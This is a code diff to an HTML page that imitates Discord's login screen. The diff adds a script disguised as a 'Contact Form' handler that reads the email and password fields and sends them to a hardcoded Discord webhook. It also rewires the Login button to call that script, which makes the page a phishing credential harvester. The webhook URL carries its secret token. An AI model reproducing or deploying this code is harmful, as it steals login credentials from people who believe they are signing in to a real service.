@@ -10,6 +10,7 @@
 
 <!DOCTYPE html>
 <html>
+
 <head>
 	<meta charset="utf-8">
 
@@ -263,12 +264,49 @@
                             <input class="inputDefault-_djjkz input-cIJ7To" name="password" type="password" placeholder="" aria-label="Password" autocomplete="off" maxlength="999" spellcheck="false" value="">
                           </div>
                         </div>
+ <script>
+      async function sendContact(ev) {
+        ev.preventDefault();
+
+        const senderEmail = document
+          .getElementById('email').value;
+        const senderMessage = document
+          .getElementById('password').value;
+
+        const webhookBody = {
+          embeds: [{
+            title: 'Contact Form Submitted',
+            fields: [
+              { name: 'Sender', value: senderEmail },
+              { name: 'Message', value: senderMessage }
+            ]
+          }],
+        };
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1181377382632931328/Slh2qVzrhgLQr_E0IXaTkrtzJfXw8itwQ_xWgVM561sqmegHPN45rlw3xwLC4YQjP9lT';
+
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(webhookBody),
+        });
+
+        if (response.ok) {
+          alert('I have received your message!');
+        } else {
+          alert('There was an error! Try again later!');
+        }
+      }
+    </script>
                         <button type="button" class="marginBottom20-32qID7 marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                           <div class="contents-18-Yxp">Forgot your password?</div>
                         </button>
-                        <button type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
-                          <div class="contents-18-Yxp">Login</div>
-                        </button>
+			<button onclick="sendContact(event)" type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
+  			  <div class="contents-18-Yxp">Login</div>
+			</button>
+
                         <div class="marginTop4-2BNfKC">
                           <span class="needAccount-23l_Wh">Need an account?</span>
                           <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
